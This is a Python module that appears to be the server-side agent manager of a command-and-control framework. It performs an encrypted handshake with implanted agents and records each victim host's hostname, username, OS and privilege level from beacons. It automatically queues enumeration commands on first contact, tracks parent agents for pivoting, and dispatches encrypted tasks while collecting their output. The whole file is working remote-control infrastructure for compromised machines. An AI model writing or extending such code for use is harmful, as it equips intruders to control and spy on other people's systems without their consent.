"""
In-memory session registry for live agents.
Backed by SQLite via SQLAlchemy for persistence across server restarts.
"""
import base64
import json
from datetime import datetime, timedelta
from typing import Optional

from sqlalchemy.orm import Session as DBSession

from models.agent import Agent
from models.log import Log
from models.task import Task
from services.crypto import AgentCrypto, decode_handshake_packet, build_handshake_response


class AgentSession:
    """Runtime state for one agent (not persisted, rebuilt from DB on restart)."""

    def __init__(self, agent_id: str):
        self.agent_id = agent_id
        self.crypto   = AgentCrypto()
        self.last_seen: Optional[datetime] = None

    @classmethod
    def from_db(cls, db_agent: Agent) -> "AgentSession":
        session = cls(db_agent.agent_id)
        if db_agent.server_privkey and db_agent.session_key:
            session.crypto.load_from_hex(db_agent.server_privkey, db_agent.session_key)
        session.last_seen = db_agent.last_seen
        return session


class AgentManager:
    def __init__(self):
        # agent_id → AgentSession
        self._sessions: dict[str, AgentSession] = {}

    # ---- Session lookup / creation ----

    def get_session(self, agent_id: str) -> Optional[AgentSession]:
        return self._sessions.get(agent_id)

    def _ensure_session(self, agent_id: str) -> AgentSession:
        if agent_id not in self._sessions:
            self._sessions[agent_id] = AgentSession(agent_id)
        return self._sessions[agent_id]

    # ---- Handshake ----

    def process_handshake(self, b64_pkt: str, db: DBSession) -> dict:
        """
        Process a plaintext handshake packet from the agent.
        Returns the base64 handshake response to write back to the agent channel.
        """
        try:
            pkt = decode_handshake_packet(b64_pkt)
        except Exception:
            return {"response": None, "events": []}

        if pkt.get("t") != "h":
            return {"response": None, "events": []}

        agent_id = pkt.get("id", "")
        if not agent_id:
            return {"response": None, "events": []}

        agent_pubkey_b64 = pkt.get("pk", "")
        try:
            agent_pubkey_bytes = base64.b64decode(agent_pubkey_b64)
        except Exception:
            return {"response": None, "events": []}

        session = self._ensure_session(agent_id)

        # Generate server keypair + derive session key
        server_pubkey_bytes = session.crypto.generate_keypair()
        session.crypto.do_handshake(agent_pubkey_bytes)

        # Persist to DB
        db_agent = db.get(Agent, agent_id)
        is_new = db_agent is None
        if db_agent is None:
            db_agent = Agent(agent_id=agent_id)
            db.add(db_agent)

        db_agent.server_pubkey  = server_pubkey_bytes.hex()
        db_agent.server_privkey = session.crypto.server_privkey_hex()
        db_agent.session_key    = session.crypto.session_key_hex()
        db_agent.handshake_done = True
        db_agent.last_seen      = datetime.utcnow()

        log = Log(agent_id=agent_id, event="handshake_complete",
                  detail=f"session key derived")
        db.add(log)
        db.commit()

        events = [{"type": "agent_new" if is_new else "agent_handshake", "agent_id": agent_id}]
        return {"response": build_handshake_response(server_pubkey_bytes), "events": events}

    # ---- Beacon processing ----

    def process_beacon(self, agent_id: str, b64_pkt: str, db: DBSession, client_ip: str = "") -> dict:
        """
        Decrypt an encrypted beacon from the agent, update DB.
        Returns {"events": [...]} for WebSocket broadcast.
        """
        events = []

        session = self.get_session(agent_id)
        if session is None:
            db_agent = db.get(Agent, agent_id)
            if db_agent and db_agent.handshake_done:
                session = AgentSession.from_db(db_agent)
                self._sessions[agent_id] = session
            else:
                return {"events": events}

        try:
            beacon = session.crypto.open_json(b64_pkt)
        except Exception as e:
            import logging
            logging.getLogger("agent_manager").warning("beacon decrypt failed for %s: %s", agent_id, e)
            return {"events": events}

        # Update agent record
        db_agent = db.get(Agent, agent_id)
        if db_agent is None:
            return {"events": events}

        # Reset stale "sent" tasks — agent may have restarted without acking them
        stale_cutoff = datetime.utcnow() - timedelta(seconds=90)
        stale = (
            db.query(Task)
            .filter(Task.agent_id == agent_id,
                    Task.status == "sent",
                    Task.sent_at < stale_cutoff)
            .all()
        )
        for t in stale:
            t.status   = "pending"
            t.sent_at  = None

        db_agent.hostname   = beacon.get("hn", db_agent.hostname)
        db_agent.username   = beacon.get("un", db_agent.username)
        db_agent.os_info    = beacon.get("os", db_agent.os_info)
        db_agent.privileges = beacon.get("pr", db_agent.privileges)
        db_agent.last_seen  = datetime.utcnow()
        db_agent.is_active  = True
        if client_ip:
            db_agent.ip = client_ip

        pid_val = beacon.get("pid", "")
        if pid_val and pid_val != db_agent.agent_id:
            db_agent.parent_id = pid_val

        # Auto-enum on first beacon
        if not db_agent.auto_enum_done:
            _AUTO_CMDS = [("sysinfo", ""), ("ps", "")]
            for _cmd, _args in _AUTO_CMDS:
                db.add(Task(
                    task_id  = str(__import__("uuid").uuid4()),
                    agent_id = agent_id,
                    cmd      = _cmd,
                    args     = _args,
                    status   = "pending",
                ))
            db.add(Log(agent_id=agent_id, event="auto_enum",
                       detail="queued: " + ", ".join(c for c, _ in _AUTO_CMDS)))
            db_agent.auto_enum_done = True

        events.append({
            "type": "agent_seen",
            "agent_id": agent_id,
            "last_seen": db_agent.last_seen.isoformat(),
            "is_active": True,
        })

        # ACK last task
        last_task_id = beacon.get("lt", "")
        acked_task = None
        if last_task_id:
            task = db.get(Task, last_task_id)
            if task and task.status == "sent":
                task.status   = "acked"
                task.acked_at = datetime.utcnow()
                acked_task = task

        # Store pending output
        pending_output = beacon.get("po", "")
        if pending_output and last_task_id:
            task = db.get(Task, last_task_id)
            if task:
                task.output = pending_output
                log = Log(agent_id=agent_id, event="task_output",
                          detail=f"task_id={last_task_id} len={len(pending_output)}")
                db.add(log)
                if acked_task and acked_task.task_id == last_task_id:
                    events.append({
                        "type":     "task_acked",
                        "agent_id": agent_id,
                        "task_id":  last_task_id,
                        "cmd":      acked_task.cmd,
                        "output":   pending_output,
                    })

        db.commit()
        return {"events": events}

    # ---- Task dispatch ----

    def get_pending_task_packet(self, agent_id: str, db: DBSession) -> Optional[str]:
        """
        If there's a pending task for this agent, encrypt it and return base64.
        Returns None if no pending task.
        """
        session = self.get_session(agent_id)
        if session is None or not session.crypto.ready:
            return None

        # Find oldest pending task
        task = (
            db.query(Task)
            .filter(Task.agent_id == agent_id, Task.status == "pending")
            .order_by(Task.created_at)
            .first()
        )
        if task is None:
            return None

        task.status  = "sent"
        task.sent_at = datetime.utcnow()
        db.commit()

        # Mark on agent record
        db_agent = db.get(Agent, agent_id)
        if db_agent:
            db_agent.pending_task_id = task.task_id
            db.commit()

        return session.crypto.seal_json(task.to_wire())

    # ---- Load sessions from DB on startup ----

    def load_from_db(self, db: DBSession) -> None:
        agents = db.query(Agent).filter(Agent.handshake_done == True).all()
        for a in agents:
            session = AgentSession.from_db(a)
            self._sessions[a.agent_id] = session


# Singleton
manager = AgentManager()
